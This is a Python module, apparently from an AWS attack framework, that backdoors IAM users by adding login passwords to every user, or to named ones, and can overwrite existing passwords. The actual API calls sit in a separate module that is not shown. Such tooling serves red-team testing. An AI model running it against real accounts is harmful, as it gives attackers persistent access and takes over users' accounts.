#!/usr/bin/env python3


    #'description': ''This module attempts to add a password to users in the account. If all users are going to be backdoored, if it has not already been run, this module will run "enum_users_roles_policies_groups" to fetch all of the users in the account. Passwords can not be added to user accounts that 1) have a password already or 2) have ever had a password, regardless if it has been used before or not. If the module detects that a user already has a password, they will be ignored.',
import datetime
import argparse
from random import choice
import string
from botocore.exceptions import ClientError
import importlib

target = ''

technique_info = {
    'blackbot_id': 'T1531.b.001',
    'external_id': '',
    'controller': 'iam_backdoor_users_password',
    'services': ['IAM'],
    'prerequisite_modules': ['iam_enum_users'],
    'arguments_to_autocomplete': ['--usernames', '--update'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'intent': 'Adds a password to users without one.',
    'name': 'Account Access Removal:Modify Target Accounts Authentication' ,

}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--usernames', required=False, default=None, help='A comma-separated list of usernames of users in the AWS account to backdoor. If not supplied, it defaults to every user in the account')
parser.add_argument('--update', required=False, default=False, action='store_true', help='Try to update login profiles instead of creating a new one. This can be used to change other users passwords who already have a login profile.')


def main(args, awsattack_main):
    session = awsattack_main.get_active_session()
    args = parser.parse_args(args)
    fetch_data = awsattack_main.fetch_data

    users = []

    if args.usernames is not None:
        if ',' in args.usernames:
            users = args.usernames.split(',')
        else:
            users = [args.usernames]

    else:
        if fetch_data(['IAM', 'Users'], technique_info['prerequisite_modules'][0], '--users') is False:
            print('FAILURE')
            print('  SUB-MODULE EXECUTION FAILED')
            return None

        for user in session.IAM['Users']:
            if 'PasswordLastUsed' not in user or args.update:
                users.append(user['UserName'])

    import_path = 'ttp.src.iam_backdoor_users_password_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main, data=users)

def summary(data, awsattack_main):
    out = ''
    if 'backdoored_password_count' in data:
        count = data['backdoored_password_count']
        out += '  {} user(s) backdoored.\n'.format(count)
    return out


